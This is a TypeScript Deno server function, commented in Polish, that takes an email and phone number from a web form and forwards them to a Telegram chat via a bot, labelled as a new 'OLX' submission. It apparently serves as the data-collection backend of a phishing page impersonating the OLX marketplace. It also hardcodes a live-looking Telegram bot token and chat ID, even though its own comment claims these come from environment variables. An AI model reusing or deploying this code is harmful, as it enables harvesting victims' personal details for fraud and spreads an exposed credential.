/*
  # Wyślij dane formularza do Telegram Bot
  
  1. Cel funkcji
    - Odbiera dane formularza (email i telefon) z frontendu
    - Wysyła sformatowaną wiadomość do określonego czatu Telegram przez bota
    
  2. Bezpieczeństwo
    - Nagłówki CORS dla dostępu z frontendu
    - Zmienne środowiskowe dla tokenu bota i ID czatu
    
  3. Obsługa błędów
    - Kompleksowa obsługa błędów dla wywołań API
    - Właściwe kody statusu HTTP
*/

interface FormData {
  email: string;
  phone: string;
}

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization",
};

Deno.serve(async (req: Request) => {
  try {
    if (req.method === "OPTIONS") {
      return new Response(null, {
        status: 200,
        headers: corsHeaders,
      });
    }

    if (req.method !== "POST") {
      return new Response(
        JSON.stringify({ error: "Metoda niedozwolona" }),
        {
          status: 405,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }

    const { email, phone }: FormData = await req.json();

    // Validate input
    if (!email || !phone) {
      return new Response(
        JSON.stringify({ error: "Email i telefon są wymagane" }),
        {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }

    // Get environment variables
    const botToken = "8464545234:AAHE9DsHwZ_9DEM5bMeQNd4r54YhPDBIz9g";
    const chatId = "-1002904177569";

    if (!botToken || !chatId) {
      console.error("Missing Telegram configuration");
      return new Response(
        JSON.stringify({ error: "Błąd konfiguracji serwera" }),
        {
          status: 500,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }

    // Format message for Telegram
    const message = `🆕 Nowe zgłoszenie OLX\n\n📧 Email: ${email}\n📱 Telefon: ${phone}\n\n⏰ Data: ${new Date().toLocaleString('pl-PL')}`;

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    const telegramResponse = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    });

    if (!telegramResponse.ok) {
      const errorText = await telegramResponse.text();
      console.error("Telegram API error:", errorText);
      throw new Error("Nie udało się wysłać wiadomości do Telegram");
    }

    return new Response(
      JSON.stringify({ 
        success: true, 
        message: "Dane wysłane pomyślnie" 
      }),
      {
        status: 200,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      }
    );

  } catch (error) {
    console.error("Błąd w funkcji send-to-telegram:", error);
    
    return new Response(
      JSON.stringify({ 
        error: "Wewnętrzny błąd serwera",
        details: error.message 
      }),
      {
        status: 500,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      }
    );
  }
});